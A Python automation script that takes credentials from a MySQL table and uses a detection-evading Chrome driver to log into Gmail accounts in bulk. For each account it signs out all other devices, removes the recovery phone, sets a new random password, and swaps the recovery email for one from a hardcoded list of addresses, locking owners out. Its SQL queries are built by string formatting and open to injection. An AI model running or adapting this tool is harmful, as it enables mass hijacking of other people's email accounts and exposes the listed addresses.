import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
import time
import random
import mysql.connector
def db_connection():
    mydb = mysql.connector.connect(
        host='localhost',
        database='gmail_pass',
        user='root',
        password='password',
        auth_plugin='mysql_native_password')
    return mydb
def gmail_selection():# Done
        mydb=db_connection()
        mycursor = mydb.cursor(dictionary=True, buffered=True)
        mycursor.execute("SELECT * FROM gmail_list WHERE status = 0 ORDER BY updated_at ASC LIMIT 1")
        # mycursor.execute("SELECT * FROM gmail_list WHERE status = 0 ORDER BY id ASC LIMIT 1")
        
        mydb.close()
        try:
            myresult = mycursor.fetchone()
        except:
            return None
        mydb.close()
        return myresult
def gmail_update(status,id):# Done
        # confirm = 1
        # Fail = 2
        # login failed = 3
        # recovery = 4
        # others = 5
        mydb=db_connection()
        mycursor = mydb.cursor()
        sql = "UPDATE gmail_list set status = '%s', updated_at = now() where id = %s" % (status,id)
        mycursor.execute(sql)
        mydb.commit()
        mydb.close()

def gmail_name_update(mail,id):# Done
    mydb=db_connection()
    mycursor = mydb.cursor()
    sql = "UPDATE gmail_list set gmail = '%s' where id = %s" % (mail,id)
    mycursor.execute(sql)
    mydb.commit()
    mydb.close()
def gmail_recovery_update(recovery_email,id):# Done
    mydb=db_connection()
    mycursor = mydb.cursor()
    sql = "UPDATE gmail_list set recovery = '%s' where id = %s" % (recovery_email,id)
    mycursor.execute(sql)
    mydb.commit()
    mydb.close()
def gmail_pass_update(password,id):# Done
    mydb=db_connection()
    mycursor = mydb.cursor()
    sql = "UPDATE gmail_list set password = '%s' where id = %s" % (password,id)
    mycursor.execute(sql)
    mydb.commit()
    mydb.close()
def visibil_element(by, selector, wait=5):# Done
        print(selector)
        element = False
        if by == 'name':
            byselector = By.NAME
        if by == 'xpath':
            byselector = By.XPATH
        if by == 'css':
            byselector = By.CSS_SELECTOR
        if by == 'id':
            byselector = By.ID
        try:
            element = WebDriverWait(driver, wait).until(
                EC.visibility_of_element_located((byselector, selector)))
        except Exception as e:
            print(e)
            element = False
        if element == False:
            print("visibil_element not find: ", selector)
        return element
def recovery_return():#done
    mydb=db_connection()
    mycursor = mydb.cursor(buffered=True)
    mycursor.execute("SELECT recovery FROM gmail_list WHERE recovery IS NOT NUll")
    
    try:
        myresult = mycursor.fetchone()[0]
    except:
        myresult = None
    if myresult == None:
        rec = ["CurtisW05tf@outlook.com","antoniacicero@outlook.com","janaespiller@outlook.com","ferminahadden@outlook.com","antonettedesoto@outlook.com","mickielwood@outlook.com","donniekoizel9@gmail.com"]
        ran = random.sample(rec,1)
        myresult= (ran[0])
    mydb.close()
    return myresult
    

def ran_password():# Done
    
        characters ="abcdefghijklmnopshwyz"
        upper ="ABCDEFGHIJKLMNOPQPSHWYZ"
        symbol ="@%"
        num = "0123456789"
        string = characters+symbol+num+upper
        length = 8
        password = "".join(random.sample(string,length))
        print("Random password:",password)
        return password
    
def gmail_login(email_address,email_pass):# Done
    try:
        time.sleep(2)
        input_email = visibil_element('css', 'input',2)
        input_email.send_keys(email_address)
        time.sleep(3)
        input_email.send_keys(Keys.RETURN)
        
        inputck =visibil_element('xpath', '//input[@name="ca"]',3)
        if inputck:
            return "Capture"
        login_error = visibil_element('xpath', '//div[@class="o6cuMc Jj6Lae"]')
        if login_error:
            return 2
        gmail_error = visibil_element('xpath', '//div[@class="o6cuMc"]',3)
        if gmail_error:
            return 3
        input_pass =visibil_element('xpath', '//input[@type="password"]',3)
        
        
        if input_pass == False:
            return 3
        input_pass.send_keys(email_pass)
        input_pass.send_keys(Keys.RETURN)
        time.sleep(3)
        inputck =visibil_element('xpath', '//input[@name="ca"]',3)
        if inputck:
            return "Capture"
        pass_error= visibil_element('xpath', '//div[@class="OyEIQ uSvLId"]',3)
        if pass_error:
            return 2
        try:
            check_login = visibil_element('xpath', '//input[@type="password"]',3)
            if check_login:
                return "login_failed"
        except Exception:
            pass
        
        return True
    except Exception:
        return 3

def recovery_email_input(driver,recovery_email):#done
    try:
        rec = visibil_element('xpath', '//ul//child::li[4]',2)
        recovery_input =True
    except Exception:
        recovery_input =False
    if recovery_input == True:
        rec_final = visibil_element('xpath', '//ul//child::li[3]',2)
        rec_final.click()
        time.sleep(0.5)
        driver.find_element(By.XPATH, '//input[@type ="email"]').send_keys(recovery_email)
        time.sleep(0.5)
        driver.find_element(By.XPATH, '//input[@type ="email"]').send_keys(Keys.RETURN)
        
def language_cng(driver):# done
    try:
        driver.get("https://myaccount.google.com/language?")
        driver.find_element(By.XPATH, '//span//parent::button[@aria-label]' ).click()
        time.sleep(0.5)
        driver.find_element(By.XPATH, '//span[text()="English"]//parent::span//parent::span//parent::li[@aria-label="English"]' ).click()
        driver.find_element(By.XPATH, '//span[text()="United States"]//parent::span//parent::span//parent::li[@aria-label="United States"]' ).click()
        time.sleep(0.5)
        driver.find_element(By.XPATH, '//button[@data-mdc-dialog-action="ok"]' ).click()
        time.sleep(2)
        return True
    except Exception:
        return False
    
def remove_number_df():# done
    try:
        remove_number = visibil_element('xpath', '(//span[@class="DPvwYc MRcnif"])[2]',3)
        if remove_number:
            remove_number.click()
        remove_number_f = visibil_element('xpath','(//span[@class="CwaK9"]//child::span[@class="RveJvd snByac"])[4]',3)
        if remove_number_f:
            remove_number_f.click()
        return True
    except NoSuchElementException:
        return False

def device_check_df(driver):
    device_check_link = "https://myaccount.google.com/u/0/device-activity"
    driver.get(device_check_link)
    try:
        time.sleep(2)
        check_device_count = len(driver.find_elements(By.XPATH, '//div[@class="Ivdcjd"]'))
        check_device_count_f = check_device_count - 1
        for x in range(0,check_device_count_f):
            device_log_out_format_value = 2
            time.sleep(2)
            try:
                device_log_out = visibil_element('xpath','(//div[@class="Ivdcjd"])[{0}]'.format(device_log_out_format_value),2)
            except:
                device_log_out = False
            if device_log_out:
                device_log_out.click()
            else:
                break
            device_log_out_format_value += 1
            try:
                device_log_out_f = visibil_element('xpath','//span[text()="Sign out"]//parent::button[@type="button"]',2)
                if device_log_out_f == False:
                    print("Value of element: False1" )
                    driver.back()
                    continue
                device_log_out_f.click()
            except NoSuchElementException:
                pass
            try:
                device_log_out_f =visibil_element('xpath', '(//span[@class="VfPpkd-vQzf8d"])[4]',3)
                device_log_out_f.click()
            except:
                pass
            try:
                okk_click =visibil_element('xpath','(//button[@jsname="LgbsSe"]//child::span)[2]',3)
                okk_click.click()
            except NoSuchElementException:
                pass
            time.sleep(3)
    except NoSuchElementException:
        pass
    
def change_password(driver,new_pass):
    pass_change = "https://myaccount.google.com/signinoptions/password"
    driver.get(pass_change)
    time.sleep(2)
    try:
        input_pass_1 = visibil_element('xpath', '(//input[@type="password"])[1]',3)
        input_pass_1.send_keys(new_pass)
        input_pass_2 = visibil_element('xpath',  '(//input[@type="password"])[2]',3)
        input_pass_2.send_keys(new_pass)
        try:
            pass_submit = visibil_element('xpath','//button[@type="submit"]',3)
            pass_submit.click()
        except:
            pass_submit = visibil_element('xpath', '//button[@type="button"]',3)
            pass_submit.click()
        time.sleep(2)
        return True
    except NoSuchElementException:
        return False

def update_recovery(driver,recovery_email):
    recovery_link = "https://myaccount.google.com/recovery/email"
    try:
        driver.get(recovery_link)
        time.sleep(2)
        input_recovery_clear = driver.find_element(By.XPATH, '(//input[@type="email"])').clear()
        time.sleep(0.5)
        input_recovery = visibil_element('xpath', '(//input[@type="email"])',3)
        input_recovery.send_keys(recovery_email)
        time.sleep(0.5)
        input_recovery_submit = driver.find_element(By.XPATH, '(//input[@type="email"])').send_keys(Keys.RETURN)
        time.sleep(2)
        return True
    except:
        return False
    
def gmail_name_find(driver):
    gmail_link_for_mail = 'https://myaccount.google.com/personal-info'
    driver.get(gmail_link_for_mail)
    new_gmail = driver.find_element(By.XPATH, '(//div[@class="bJCr1d"])[4]').text
    return new_gmail

for x in range(100000):
    driver = uc.Chrome()
    time.sleep(2)
    login = 'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Frescuephone&osid=1&rart=ANgoxcfbj5MICImsby3i6E4WliB4NiCObSuRKGTYLSt03bQVr5EN0ekxnuxLrRGkyz5DKW13ZqMxZkUoZn1oMKAXz3u6m-8mXw&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
    driver.get(login)
    ### def Start

    

    
    ### def End
    mailinfo= gmail_selection()
    if mailinfo is None:
        break
    id = mailinfo['id']
    gmail_update(9,id)
    email_address = mailinfo['gmail']
    email_pass = mailinfo['password']
    recovery_email= mailinfo['recovery']
    new_pass = ran_password()
    print("ID: ", id)
    login_value = gmail_login(email_address,email_pass)
    if login_value == "Capture":
        print("CAPTURE")
        driver.close() 
        time.sleep(60)
        continue

    
    if login_value == True:
        if recovery_email is None:
            remove_number = visibil_element('xpath', '(//span[@class="DPvwYc MRcnif"])[2]',2)
            input_pass_1 = visibil_element('xpath', '(//input[@type="password"])[1]',2)
            if input_pass_1  == remove_number:
                gmail_update(2,id)
                driver.close()
                continue
            if remove_number:
                remove_number_df()
                
            device_check_df(driver)
            change_password(driver,new_pass)
            recovery_email_new = recovery_return()
            update_recovery(driver,recovery_email_new)
            email_name = gmail_name_find(driver)
            gmail_name_update(email_name,id)
            gmail_pass_update(new_pass,id)
            gmail_recovery_update(recovery_email_new,id)
            gmail_update(1,id)
            
            lang = language_cng(driver)
            if lang == False:
                driver.close()
                continue
            
            print("DONE")
            driver.close()
            continue
        if recovery_email is not None:
            recovery_email_input(driver,recovery_email)
        lang = language_cng(driver)
        if lang == False:
            gmail_update(2,id)
            driver.close()
            continue
        change_password(driver,new_pass)
        gmail_pass_update(new_pass,id)
        gmail_update(1,id)
        print("DONE")
        driver.close()
        continue
            
    elif login_value == 3:
        gmail_update(3,id)
        driver.close()
        continue
        
    elif login_value ==2:
        gmail_update(2,id)
        driver.close()
        continue
    print("DONE")
